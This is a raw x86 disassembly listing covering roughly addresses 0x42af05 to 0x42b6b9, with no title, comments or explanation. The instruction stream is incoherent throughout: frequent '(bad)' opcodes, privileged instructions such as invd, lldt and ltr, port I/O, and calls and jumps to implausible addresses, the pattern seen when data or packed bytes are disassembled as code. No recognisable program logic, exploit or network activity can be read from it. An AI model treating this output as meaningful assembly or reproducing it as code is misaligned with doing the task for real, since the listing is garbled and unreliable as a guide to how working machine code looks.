  42af05:	cmp    ecx,esi
  42af07:	bswap  edi
  42af09:	(bad)
  42af0d:	mov    esi,DWORD PTR [ebp-0x4]
  42af10:	mov    esi,ecx
  42af12:	clc    
  42af13:	repnz add esi,DWORD PTR [ebp+0x45]
  42af17:	push   ebx
  42af18:	xor    eax,DWORD PTR [ebp+0x3]
  42af1b:	xor    bl,BYTE PTR [edi-0x64]
  42af1e:	pop    ebx
  42af1f:	jmp    0x42afe6
  42af24:	mov    esi,DWORD PTR [ebp-0x7d]
  42af27:	xor    ebp,DWORD PTR [eax]
  42af29:	lea    eax,[ebp-0x8]
  42af2c:	xor    eax,0xc7ef9cf2
  42af31:	neg    eax
  42af33:	ins    DWORD PTR es:[edi],dx
  42af34:	test   esi,edi
  42af36:	clc    
  42af37:	pop    esp
  42af38:	inc    ebp
  42af39:	or     BYTE PTR [ecx+0x450f0c7d],cl
  42af3f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  42af45:	add    cl,al
  42af47:	jne    0x42aee7
  42af49:	mov    esi,DWORD PTR [edx]
  42af4b:	in     al,dx
  42af4c:	push   esi
  42af4d:	xor    BYTE PTR [ebp-0xe],dh
  42af50:	add    edi,esi
  42af52:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  42af58:	add    cl,bh
  42af5a:	mov    edi,DWORD PTR [ebp+0x8]
  42af5d:	mov    DWORD PTR [ebp-0x14],esi
  42af60:	add    esi,DWORD PTR [ebp+0x3c]
  42af63:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  42af69:	mov    ah,0x30
  42af6b:	sahf   
  42af6c:	pushf  
  42af6d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  42af73:	jne    0x42af00
  42af75:	mov    ecx,DWORD PTR [esp+ebp*8]
  42af78:	icebp  
  42af79:	icebp  
  42af7a:	shl    edx,0xf2
  42af7d:	(bad)  
  42af7e:	mov    ah,0x16
  42af80:	push   0xf8b9375
  42af85:	in     al,dx
  42af86:	jmp    0x42af79
  42af88:	add    dl,dh
  42af8a:	mov    edi,esi
  42af8c:	or     al,0x8
  42af8e:	inc    ebp
  42af8f:	jne    0x42af94
  42af91:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  42af97:	ret    
  42af98:	or     bh,bh
  42af9a:	jge    0x42af84
  42af9c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  42afa2:	xor    edi,eax
  42afa4:	add    esi,DWORD PTR [ebp-0x77]
  42afa7:	mov    ebx,esp
  42afa9:	clc    
  42afaa:	neg    DWORD PTR [ebp-0x7c]
  42afad:	xor    eax,DWORD PTR [eax]
  42afaf:	cmp    eax,DWORD PTR [eax]
  42afb1:	repz jne 0x42af49
  42afb4:	xor    eax,DWORD PTR [ecx]
  42afb6:	add    ebx,DWORD PTR [eax]
  42afb8:	mov    DWORD PTR [ebp-0x8],eax
  42afbb:	mov    eax,edi
  42afbd:	cld    
  42afbe:	lock pop eax
  42afc0:	test   DWORD PTR [ebx],esi
  42afc2:	clc    
  42afc3:	add    edx,DWORD PTR [edi-0x740bff77]
  42afc9:	fdivp  st(4),st
  42afcb:	test   ecx,esi
  42afcd:	(bad)  
  42afce:	jnp    0x42afcf
  42afd0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  42afd6:	jae    0x42af63
  42afd8:	sub    edi,esp
  42afda:	(bad)  
  42afdb:	shl    DWORD PTR [eax-0x3e],0x89
  42afdf:	leave  
  42afe0:	call   0x819866ed
  42afe5:	in     al,dx
  42afe6:	(bad)  
  42afe7:	in     al,dx
  42afe8:	add    bh,al
  42afea:	mov    esp,edi
  42afec:	in     al,dx
  42afed:	test   DWORD PTR [ebp-0x8],edi
  42aff0:	mov    eax,DWORD PTR [ebp+0x2b]
  42aff3:	xor    al,0x3
  42aff5:	pushf  
  42aff6:	jnp    0x5731ac2f
  42affc:	xor    edx,DWORD PTR [edi-0x77]
  42afff:	push   ecx
  42b000:	loopne 0x42b035
  42b002:	jne    0x42afbf
  42b004:	mov    esi,DWORD PTR [edx-0x20]
  42b007:	add    BYTE PTR [ebp-0x3d],bh
  42b00a:	xor    eax,DWORD PTR [ebp-0x73]
  42b00d:	mov    edi,DWORD PTR [esi]
  42b00f:	cld    
  42b010:	jb     0x42afd8
  42b012:	add    bl,al
  42b014:	jne    0x42b05b
  42b016:	mov    edx,DWORD PTR [edi-0x10]
  42b019:	jge    0x42b098
  42b01b:	mov    esi,DWORD PTR [ebx]
  42b01d:	lock add ecx,DWORD PTR [ebp+0x3b]
  42b021:	xor    esi,DWORD PTR [ebp-0x77]
  42b024:	mov    esi,eax
  42b026:	lock inc ebp
  42b028:	jge    0x42b05f
  42b02a:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  42b031:	dec    ebp
  42b032:	mov    esi,DWORD PTR [ebx]
  42b034:	loopne 0x42afbf
  42b036:	jge    0x42b030
  42b038:	add    DWORD PTR [ebp-0x7d],eax
  42b03b:	cmc    
  42b03c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42b043:	dec    ebp
  42b044:	hlt    
  42b045:	xor    ebx,DWORD PTR [ebp-0x77]
  42b048:	mov    esi,esp
  42b04a:	in     al,0x45
  42b04c:	jge    0x42b07f
  42b04e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42b055:	dec    ebp
  42b056:	ins    BYTE PTR es:[edi],dx
  42b057:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  42b05d:	inc    ebp
  42b05e:	hlt    
  42b05f:	xor    eax,0xb88b9f75
  42b064:	add    al,0x95
  42b066:	icebp  
  42b067:	add    dl,dh
  42b069:	mov    DWORD PTR [ebp+0x20],ebx
  42b06c:	cmp    eax,DWORD PTR [ebp+0xf]
  42b06f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42b073:	fistp  WORD PTR [ebx+0x0]
  42b076:	inc    ebp
  42b077:	mov    ebx,DWORD PTR [edi+0xc]
  42b07a:	add    eax,eax
  42b07c:	inc    ebp
  42b07d:	test   BYTE PTR [ebx],dh
  42b07f:	add    eax,DWORD PTR [ebx]
  42b081:	add    BYTE PTR [esi+0x45],bl
  42b084:	ret    0x85
  42b087:	jnp    0x54433456
  42b08d:	inc    bp
  42b08f:	inc    ebp
  42b090:	xor    eax,0xc78a9cb9
  42b095:	add    ah,bl
  42b097:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  42b09d:	add    BYTE PTR [ebx+0x3],dl
  42b0a0:	mov    esi,0x708088b
  42b0a5:	cmp    esi,eax
  42b0a7:	setle  BYTE PTR [ecx-0x74fcffce]
  42b0ae:	mov    esp,edi
  42b0b0:	call   0x33cdf602
  42b0b5:	or     BYTE PTR [ebx],al
  42b0b7:	inc    ecx
  42b0b8:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  42b0be:	and    BYTE PTR [ebp-0x7074f0bb],al
  42b0c4:	lock add cl,al
  42b0c7:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  42b0ce:	mov    ch,0x45
  42b0d0:	clc    
  42b0d1:	xor    eax,DWORD PTR [ebp+0x3]
  42b0d4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  42b0da:	inc    ebp
  42b0db:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  42b0e1:	mov    edi,eax
  42b0e3:	mov    eax,DWORD PTR [ebp+0x3c]
  42b0e6:	mov    ecx,DWORD PTR [eax]
  42b0e8:	hlt    
  42b0e9:	inc    ebp
  42b0ea:	ror    DWORD PTR [ebx+0x818c45],0xf4
  42b0f1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  42b0f7:	push   ebp
  42b0f8:	mov    edi,DWORD PTR [ebx]
  42b0fa:	in     al,dx
  42b0fb:	jne    0x42b0be
  42b0fd:	mov    eax,DWORD PTR [ebp-0x28]
  42b100:	add    DWORD PTR [eax],0xe8058dec
  42b106:	clc    
  42b107:	mov    eax,DWORD PTR [edi]
  42b109:	clc    
  42b10a:	add    dh,dl
  42b10c:	rol    WORD PTR [ebp-0x1],cl
  42b110:	mov    edx,DWORD PTR [eax+0x8]
  42b113:	jne    0x42b0d5
  42b115:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  42b11c:	inc    ebp
  42b11d:	push   esp
  42b11e:	test   DWORD PTR [ecx+0xf],ecx
  42b121:	sub    edx,esp
  42b123:	add    eax,DWORD PTR [eax]
  42b125:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  42b12b:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  42b132:	mov    eax,DWORD PTR [ecx]
  42b134:	and    BYTE PTR [eax],al
  42b136:	inc    edx
  42b137:	adc    BYTE PTR [eax],al
  42b139:	inc    ebp
  42b13a:	inc    cx
  42b13d:	push   esp
  42b13e:	or     BYTE PTR [ebp+0x0],dh
  42b141:	push   edx
  42b142:	enterw 0xc1,0x4d
  42b147:	mov    esp,DWORD PTR [esi+0x20]
  42b14a:	add    DWORD PTR [ecx-0x7b],eax
  42b14d:	add    eax,DWORD PTR [ebx]
  42b14f:	str    WORD PTR [eax+0x45]
  42b153:	lea    ecx,[ebx+0x45890801]
  42b159:	sbb    BYTE PTR [ebx],al
  42b15b:	dec    ebp
  42b15c:	cmp    al,0xf
  42b15e:	inc    ebp
  42b15f:	push   eax
  42b160:	mov    esi,DWORD PTR [ebx]
  42b162:	push   eax
  42b163:	add    eax,eax
  42b165:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  42b16c:	inc    ebp
  42b16d:	add    BYTE PTR ds:0x8b4d8c00,dh
  42b173:	xor    edx,esp
  42b175:	add    eax,esi
  42b177:	mov    ebx,eax
  42b179:	loopne 0x42b1c0
  42b17b:	dec    ebp
  42b17c:	mov    ecx,DWORD PTR [edi]
  42b17e:	cld    
  42b17f:	push   eax
  42b180:	xchg   DWORD PTR [ebx],esi
  42b182:	add    DWORD PTR [ebx],ebp
  42b184:	add    BYTE PTR [ebx],ch
  42b186:	or     BYTE PTR [ecx],bh
  42b188:	dec    ecx
  42b189:	loopne 0x42b18e
  42b18b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  42b191:	push   ebp
  42b192:	add    DWORD PTR [ebx+0x55100800],eax
  42b198:	dec    ebp
  42b199:	jmp    0x42b124
  42b19b:	mov    esp,DWORD PTR [eax]
  42b19d:	sbb    dl,dl
  42b19f:	inc    eax
  42b1a0:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42b1a6:	add    BYTE PTR [ebx+0x74528555],cl
  42b1ac:	push   ebp
  42b1ad:	div    DWORD PTR [ebx]
  42b1af:	and    eax,DWORD PTR [ebx]
  42b1b1:	add    edx,DWORD PTR [edx-0x30]
  42b1b4:	jno    0x42b141
  42b1b6:	inc    DWORD PTR [eax+eiz*1]
  42b1b9:	inc    ebp
  42b1ba:	push   eax
  42b1bb:	push   eax
  42b1bc:	mov    esp,DWORD PTR [edi-0x74beff1c]
  42b1c2:	mov    edi,esp
  42b1c4:	push   eax
  42b1c5:	inc    ebp
  42b1c6:	enter  0x458b,0x8
  42b1ca:	push   ecx
  42b1cb:	(bad)  
  42b1cc:	call   0x10cbba4
  42b1d1:	pop    ss
  42b1d2:	push   ebp
  42b1d3:	mov    ecx,DWORD PTR [ebx+0x489408]
  42b1d9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  42b1df:	push   ecx
  42b1e0:	jo     0x42b1ca
  42b1e2:	inc    DWORD PTR [edi]
  42b1e4:	or     BYTE PTR [eax],al
  42b1e6:	call   0xcdb930
  42b1eb:	fmul   QWORD PTR [ebp+0x55]
  42b1ee:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  42b1f4:	mov    bh,0x8c
  42b1f6:	adc    al,0x9e
  42b1f8:	dec    esp
  42b1f9:	xor    bl,BYTE PTR [eax]
  42b1fb:	mov    ecx,DWORD PTR [ebp+0xc]
  42b1fe:	mov    eax,DWORD PTR [ebp-0x4]
  42b201:	mov    esi,DWORD PTR [edi-0x3148f924]
  42b207:	push   es
  42b208:	retf   
  42b209:	mov    BYTE PTR [ebp-0x30],0x3b
  42b20d:	inc    ebp
  42b20e:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  42b215:	retf   0x83fc
  42b218:	into   
  42b219:	dec    ebp
  42b21a:	retf   
  42b21b:	mov    ecx,DWORD PTR [ebp-0x74]
  42b21e:	mov    eax,DWORD PTR [eax]
  42b220:	fdiv   QWORD PTR [ebx]
  42b222:	mov    bh,0x3
  42b224:	push   es
  42b225:	mov    esi,ecx
  42b227:	sbb    cl,dl
  42b229:	dec    ebp
  42b22a:	sar    DWORD PTR [ebx],cl
  42b22c:	push   ebp
  42b22d:	jne    0x42b23e
  42b22f:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  42b235:	lea    ebx,[eax]
  42b237:	call   0xf4cc3dfe
  42b23c:	sbb    dh,dl
  42b23e:	add    edx,ebx
  42b240:	push   ebp
  42b241:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42b247:	push   ecx
  42b248:	mov    DWORD PTR [eax-0x30],edx
  42b24b:	test   DWORD PTR [edx],eax
  42b24d:	xadd   esp,esi
  42b250:	pop    es
  42b251:	add    cl,dl
  42b253:	mov    eax,ecx
  42b255:	or     al,0x45
  42b257:	(bad)  
  42b258:	push   eax
  42b259:	add    DWORD PTR [edx+0x0],eax
  42b25c:	add    ecx,DWORD PTR [ecx]
  42b25e:	and    dh,cl
  42b260:	call   0xc6bb30
  42b265:	add    DWORD PTR [ebp+0x0],edx
  42b268:	mov    esp,DWORD PTR [ebp+0x18]
  42b26b:	add    BYTE PTR [eax+0x24],cl
  42b26e:	xor    eax,DWORD PTR [eax]
  42b270:	add    esp,DWORD PTR [esi+0x3b]
  42b273:	inc    ebp
  42b274:	je     0x42b1f9
  42b276:	push   ecx
  42b277:	or     cl,BYTE PTR [ebp-0x77]
  42b27a:	add    eax,esi
  42b27c:	or     al,0x1e
  42b27e:	inc    eax
  42b27f:	add    BYTE PTR [ebx],al
  42b281:	data16 and BYTE PTR [ebp+0x50],al
  42b285:	sub    DWORD PTR [ecx],0x8
  42b288:	add    BYTE PTR [ebp-0x75],ah
  42b28b:	add    BYTE PTR [eax],bl
  42b28d:	enter  0x894d,0x8b
  42b291:	int3   
  42b292:	loopne 0x42b24e
  42b294:	rol    BYTE PTR [eax],0x33
  42b297:	lea    cx,[ebp+0xa]
  42b29b:	data16 jb 0x42b2e3
  42b29e:	add    BYTE PTR [ebx+0x44890855],cl
  42b2a4:	sbb    ah,al
  42b2a6:	inc    ebp
  42b2a7:	inc    edx
  42b2a8:	lldt   WORD PTR [edx+0x66]
  42b2ac:	xor    ecx,DWORD PTR [eax]
  42b2ae:	sub    ecx,DWORD PTR [eax]
  42b2b0:	mov    eax,DWORD PTR [eax]
  42b2b2:	or     al,0x66
  42b2b4:	ror    edx,cl
  42b2b6:	dec    ebp
  42b2b7:	inc    ebp
  42b2b8:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  42b2be:	cld    
  42b2bf:	or     BYTE PTR [edi+0x4501dd],dl
  42b2c5:	enter  0xeece,0xcb
  42b2c9:	(bad)  
  42b2ca:	dec    ebp
  42b2cb:	mov    al,0x8b
  42b2cd:	jmp    0xea27:0x450a3320
  42b2d4:	xchg   esi,ebp
  42b2d6:	add    edi,eax
  42b2d8:	add    BYTE PTR [eax+0x3f52ed55],bh
  42b2de:	push   ebp
  42b2df:	inc    ebp
  42b2e0:	xor    edx,eax
  42b2e2:	add    ebp,esi
  42b2e4:	push   edx
  42b2e5:	push   bp
  42b2e7:	inc    ebp
  42b2e8:	jmp    ecx
  42b2ea:	push   esp
  42b2eb:	(bad)  
  42b2ec:	inc    edx
  42b2ee:	sbb    al,0x33
  42b2f0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  42b2f7:	add    BYTE PTR [ebp+0x49],0x8b
  42b2fb:	jmp    0xf98b:0x100041c8
  42b302:	xor    esi,DWORD PTR [edx+0x3]
  42b305:	mov    ecx,DWORD PTR [edi]
  42b307:	fmul   DWORD PTR [edx]
  42b309:	add    BYTE PTR [eax],al
  42b30b:	lea    eax,[ebx-0x4700273c]
  42b311:	add    al,0x4f
  42b313:	pop    DWORD PTR [eax]
  42b315:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  42b31b:	push   edx
  42b31c:	inc    WORD PTR [ebp+0x8]
  42b320:	mov    eax,0x514f4d
  42b325:	(bad)
  42b329:	add    al,al
  42b32b:	xor    DWORD PTR [ebx-0x74baf730],eax
  42b331:	test   DWORD PTR [esi+0x74],esp
  42b334:	inc    ebp
  42b335:	mov    DWORD PTR [eax+0xa4e08],edi
  42b33b:	add    BYTE PTR [ecx-0x76c435bb],cl
  42b341:	or     dh,cl
  42b343:	or     eax,0x8b8d5045
  42b348:	inc    ebp
  42b349:	mov    WORD PTR [ecx+0x3b8a00],?
  42b34f:	jne    0x42b384
  42b351:	mov    edi,DWORD PTR [edx+0x8f3b18]
  42b357:	add    DWORD PTR [ebx],eax
  42b359:	add    bh,bh
  42b35b:	adc    DWORD PTR [eax],ecx
  42b35d:	adc    DWORD PTR [ebp+0x55],edi
  42b360:	push   es
  42b361:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42b367:	mov    ebp,DWORD PTR [eax+ebp*1+0x503211d0]
  42b36e:	inc    ebp
  42b36f:	mov    edx,edi
  42b371:	or     al,0xd0
  42b373:	push   eax
  42b374:	(bad)  
  42b375:	jne    0x42b32b
  42b377:	call   0x2aac5c
  42b37c:	inc    ebp
  42b37d:	shl    BYTE PTR [edx],0x84
  42b380:	out    dx,al
  42b381:	add    bh,al
  42b383:	add    BYTE PTR [ebp+esi*2-0x2c7430],bh
  42b38a:	(bad)  
  42b38b:	and    al,al
  42b38d:	fs loope 0x42b38f
  42b390:	inc    ebp
  42b391:	test   DWORD PTR [edi+ecx*1-0x37],edi
  42b395:	scas   al,BYTE PTR es:[edi]
  42b396:	inc    esp
  42b397:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  42b39e:	or     BYTE PTR [ebx-0x97717cb],0x83
  42b3a5:	call   DWORD PTR [edi]
  42b3a7:	shr    ah,0x84
  42b3aa:	xchg   DWORD PTR [eax],eax
  42b3ac:	add    DWORD PTR [eax],eax
  42b3ae:	add    bh,bh
  42b3b0:	dec    ebp
  42b3b1:	and    BYTE PTR [ecx-0x38],dl
  42b3b4:	push   eax
  42b3b5:	dec    DWORD PTR [ebx+0xfd885]
  42b3bb:	mov    BYTE PTR [ebp+0x508bac00],cl
  42b3c1:	mov    WORD PTR [ecx+0x0],ss
  42b3c4:	lea    ecx,[ebx+0x108b20d8]
  42b3ca:	mov    WORD PTR [edx],ds
  42b3cc:	add    BYTE PTR [edi+0xff01ff],al
  42b3d2:	mov    ecx,DWORD PTR [ebp-0x28]
  42b3d5:	push   ecx
  42b3d6:	shl    BYTE PTR [ebp+0x3a],0x8b
  42b3da:	inc    ebp
  42b3db:	in     al,0xeb
  42b3dd:	jno    0x42b36a
  42b3df:	push   edx
  42b3e0:	mov    DWORD PTR [eax-0x28],edx
  42b3e3:	mov    eax,DWORD PTR [ebp+0x20]
  42b3e6:	je     0x42b36f
  42b3e8:	mov    eax,DWORD PTR [ecx]
  42b3ea:	sbb    BYTE PTR [eax],al
  42b3ec:	pop    DWORD PTR [eax]
  42b3ee:	add    esi,eax
  42b3f0:	add    bl,al
  42b3f2:	adc    DWORD PTR [edi],esi
  42b3f4:	jmp    0x8bce0446
  42b3f9:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  42b400:	jne    0x42b38d
  42b402:	mov    ecx,DWORD PTR [eax]
  42b404:	in     al,0x75
  42b406:	pop    DWORD PTR [ecx+0x5701]
  42b40c:	push   edx
  42b40d:	inc    DWORD PTR [ebx]
  42b40f:	adc    BYTE PTR [ecx+0x45721cc6],cl
  42b415:	add    BYTE PTR [edi+0x9],dl
  42b418:	call   DWORD PTR [esi]
  42b41a:	and    dl,al
  42b41c:	and    bh,bh
  42b41e:	inc    edi
  42b420:	test   eax,edx
  42b422:	sldt   ebx
  42b425:	xor    al,0x0
  42b427:	pushf  
  42b428:	(bad)  
  42b429:	jmp    0x42b437
  42b42b:	mov    eax,edi
  42b42d:	or     al,0x75
  42b42f:	inc    eax
  42b430:	call   0x42ab38
  42b435:	mov    eax,eax
  42b437:	loopne 0x42b3bd
  42b439:	inc    ebp
  42b43a:	add    BYTE PTR [ebx+0x1451c00],cl
  42b440:	mov    eax,DWORD PTR [ebp+0x20]
  42b443:	add    edi,ecx
  42b445:	add    BYTE PTR [eax],ch
  42b447:	cmp    edi,0x18
  42b44a:	test   DWORD PTR [ebp+0xf],esi
  42b44d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42b454:	jne    0x42b458
  42b456:	call   0xffa1af1b
  42b45b:	leave  
  42b45c:	rcr    BYTE PTR [esp+eax*4],0x55
  42b460:	add    ah,ch
  42b462:	add    BYTE PTR [edi-0x48fef979],dh
  42b468:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  42b46f:	inc    esp
  42b470:	mov    ebx,DWORD PTR [eax]
  42b472:	fcom   st(2)
  42b474:	add    BYTE PTR [edi],bl
  42b476:	lea    ecx,[eax-0x18]
  42b479:	(bad)  
  42b47a:	push   DWORD PTR [ecx]
  42b47c:	call   0xffb501de
  42b481:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42b485:	fstp   DWORD PTR [esi+ebx*8]
  42b488:	push   ebp
  42b489:	pop    ebp
  42b48a:	mov    esi,DWORD PTR [edx-0x38]
  42b48d:	add    DWORD PTR [eax],0x28
  42b490:	mov    edi,DWORD PTR [ebx]
  42b492:	xor    esi,DWORD PTR [edx+0x3]
  42b495:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  42b499:	pop    ebp
  42b49a:	or     al,0x4
  42b49c:	inc    ecx
  42b49d:	push   ebp
  42b49e:	(bad)  
  42b49f:	in     al,dx
  42b4a0:	or     ah,ch
  42b4a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b4a3:	xbegin 0xffc82a99
  42b4a9:	clc    
  42b4aa:	adc    al,0x45
  42b4ac:	div    BYTE PTR [eax+ecx*1]
  42b4af:	pushf  
  42b4b0:	add    bh,al
  42b4b2:	jne    0x42b48c
  42b4b4:	add    DWORD PTR [ebp+0x1b00f89e],0x66710066
  42b4be:	add    eax,DWORD PTR [ebp+0x52]
  42b4c1:	adc    eax,0x60
  42b4c4:	xchg   DWORD PTR [ecx+0x3000fc01],ecx
  42b4ca:	test   DWORD PTR [eax],eax
  42b4cc:	clc    
  42b4cd:	data16 or al,BYTE PTR [ebp+0x45]
  42b4d1:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  42b4d8:	rol    BYTE PTR [ebp+0x45],1
  42b4db:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  42b4e1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  42b4e7:	push   ebx
  42b4e8:	add    BYTE PTR [edi+0x0],dl
  42b4eb:	push   ecx
  42b4ec:	jge    0x42b521
  42b4ee:	add    BYTE PTR [esi+0x4],dl
  42b4f1:	jne    0x42b558
  42b4f3:	mov    edx,0x457200
  42b4f8:	jmp    0x42b4bc
  42b4fa:	xor    edi,DWORD PTR [ebx]
  42b4fc:	pop    edi
  42b4fd:	cvtdq2ps xmm7,xmm0
  42b500:	ret    0x0
  42b503:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  42b509:	xor    ecx,DWORD PTR [edi]
  42b50b:	add    eax,DWORD PTR [ecx+0x3b]
  42b50e:	push   ebx
  42b50f:	rdpmc  
  42b511:	out    0x8d,al
  42b513:	add    BYTE PTR [eax],cl
  42b515:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  42b51b:	ret    0x450c
  42b51e:	sbb    al,0x8b
  42b520:	cmp    eax,esi
  42b522:	or     cl,al
  42b524:	or     al,0xc2
  42b526:	pop    eax
  42b527:	inc    ebp
  42b528:	add    ecx,DWORD PTR [edi]
  42b52a:	add    esi,DWORD PTR [ebp+0x39]
  42b52d:	invd   
  42b52f:	jge    0x42b53b
  42b531:	mov    eax,0x478ac0
  42b536:	cli    
  42b537:	xor    esp,ecx
  42b539:	mov    ebx,0x5b8ac0
  42b53e:	ret    0x33
  42b541:	mov    eax,0x833b8b
  42b546:	sub    BYTE PTR [ebx],al
  42b548:	inc    ebp
  42b549:	xor    ax,0x9cf8
  42b54d:	inc    bh
  42b54f:	mov    esp,esp
  42b551:	hlt    
  42b552:	test   DWORD PTR [ebp-0x8],esi
  42b555:	mov    eax,DWORD PTR [ebp-0x14]
  42b558:	xor    ecx,DWORD PTR [ebx-0x76478864]
  42b55e:	dec    edi
  42b55f:	or     BYTE PTR [eax],al
  42b561:	jne    0x42b4ec
  42b563:	mov    esi,esp
  42b565:	call   0x77a9412a
  42b56a:	inc    ebp
  42b56b:	mov    DWORD PTR [eax+0x9e4f0c],edi
  42b571:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42b577:	add    BYTE PTR [esi+0x7d],ah
  42b57a:	inc    ebp
  42b57b:	mov    bx,WORD PTR [ebp+0x8]
  42b57f:	add    DWORD PTR [ebp+0x57],0x30c008b
  42b586:	inc    ebp
  42b587:	mov    bx,di
  42b58a:	lock test BYTE PTR [ecx+0x7000801],bh
  42b591:	jge    0x42b554
  42b593:	mov    ecx,DWORD PTR [ebx-0x610613f0]
  42b599:	cli    
  42b59a:	xor    bl,bh
  42b59c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  42b5a2:	test   BYTE PTR [eax],cl
  42b5a4:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  42b5ab:	cmp    ebp,eax
  42b5ad:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42b5b4:	test   BYTE PTR [ebp+0x1],bh
  42b5b7:	mov    ebx,0x458a00
  42b5bc:	xor    esi,DWORD PTR [ebx]
  42b5be:	add    esp,DWORD PTR [esi-0x77]
  42b5c1:	pop    ebp
  42b5c2:	loopne 0x42b62a
  42b5c4:	inc    ebp
  42b5c5:	clc    
  42b5c6:	xor    edi,DWORD PTR [ebx]
  42b5c8:	add    esi,DWORD PTR [edx-0x77]
  42b5cb:	data16 fdivr QWORD PTR [ebp-0x49]
  42b5cf:	mov    ebx,0xb78afc
  42b5d4:	hlt    
  42b5d5:	xor    eax,DWORD PTR [edx+0x66]
  42b5d8:	add    BYTE PTR [ebp+0x66],bl
  42b5db:	data16 lock clc 
  42b5de:	inc    edx
  42b5df:	cmp    eax,DWORD PTR [eax]
  42b5e1:	ja     0x42b649
  42b5e3:	psubq  mm7,QWORD PTR [ebp+0x8]
  42b5e7:	ltr    WORD PTR [ebp+0x66]
  42b5eb:	add    esi,eax
  42b5ed:	add    di,WORD PTR [ebp+0x2b]
  42b5f1:	data16 data16 jge 0x42b672
  42b5f5:	mov    ebx,0xe08a8b
  42b5fa:	jge    0x42b62f
  42b5fc:	data16 data16 xor al,0x5d
  42b600:	data16 data16 jne 0x42b5fc
  42b604:	mov    edi,DWORD PTR [ebx]
  42b606:	fdiv   QWORD PTR [edx+0x7d]
  42b609:	data16 data16 jge 0x42b641
  42b60d:	mov    ebx,0x758a66
  42b612:	mov    esi,0x667233
  42b617:	pop    ebp
  42b618:	or     BYTE PTR [esi+0x0],ah
  42b61b:	clc    
  42b61c:	mov    edi,DWORD PTR [ebx]
  42b61e:	lock ja 0x42b5ac
  42b621:	(bad)  
  42b623:	jge    0x42b61c
  42b625:	invd   
  42b627:	pop    ebp
  42b628:	add    BYTE PTR [ebx],al
  42b62a:	(bad)  
  42b62b:	cmp    di,WORD PTR [ebp+0xf]
  42b62f:	data16 sbb bh,BYTE PTR [ebp+0x0]
  42b633:	mov    bx,WORD PTR [ebp-0x10]
  42b637:	pop    bp
  42b639:	fbstp  TBYTE PTR [ebx]
  42b63b:	test   DWORD PTR [ebx],eax
  42b63d:	add    BYTE PTR [ebx],bh
  42b63f:	add    BYTE PTR [esi+0x7d],ah
  42b642:	jge    0x42b5cf
  42b644:	data16 in al,dx
  42b646:	pop    ebp
  42b647:	stc    
  42b648:	bsf    ecx,DWORD PTR [ebp+0x6632009e]
  42b64f:	mov    edi,ebx
  42b651:	in     al,dx
  42b652:	test   BYTE PTR [ebp+0x0],bh
  42b655:	mov    eax,DWORD PTR [eax]
  42b657:	call   0xbd3fafe7
  42b65c:	inc    edx
  42b65d:	sahf   
  42b65e:	add    BYTE PTR [edx],dh
  42b660:	mov    bx,di
  42b663:	call   0x8b4b33f3
  42b668:	add    ebp,esp
  42b66a:	mov    bx,di
  42b66d:	jnp    0x42b695
  42b66f:	mov    DWORD PTR [ebx+0x427df808],ecx
  42b675:	mov    eax,DWORD PTR [eax]
  42b677:	call   0x7c3e41e2
  42b67c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  42b682:	data16 data16 fistp WORD PTR [ebp+0xe]
  42b687:	xor    DWORD PTR [edi-0x48fff7a9],0xfb66f403
  42b691:	fisttp WORD PTR [ecx-0x7401f77b]
  42b697:	(bad)  
  42b698:	cld    
  42b699:	jne    0x42b6dd
  42b69b:	xor    eax,DWORD PTR [eax]
  42b69d:	mov    esp,DWORD PTR [esi-0x10]
  42b6a0:	sti    
  42b6a1:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42b6a8:	data16 adc bl,bh
  42b6ab:	push   ebp
  42b6ac:	xor    ecx,DWORD PTR es:[ebx+0x42e4f88b]
  42b6b3:	mov    WORD PTR [eax],es
  42b6b5:	sahf   
  42b6b6:	data16 xor bh,bl
  42b6b9:	mov    DWORD PTR [ebx+0x3550ce4],ecx
